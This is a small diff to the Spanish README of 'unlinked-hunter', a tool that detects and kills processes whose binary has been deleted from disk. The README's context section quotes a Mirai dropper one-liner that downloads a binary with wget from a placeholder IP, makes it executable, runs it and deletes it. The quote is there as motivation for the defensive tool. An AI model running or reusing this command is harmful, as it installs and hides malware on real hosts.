@@ -1,7 +1,7 @@
 # unlinked-hunter
 Detecta y mata procesos fantasma: procesos que siguen corriendo en memoria aunque el binario o script desde el que se lanzaron ya fue borrado del disco
 
-**Contexto**: de dónde salió la idea
+**Contexto**: de dónde salió la idea.
 Analizando un malware de la familia Mirai, encontré este one-liner:
 
 dropper -> cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.0.2.1/mal.mips; chmod +x mal.mips; ./mal.mips; rm -rf mal.mips
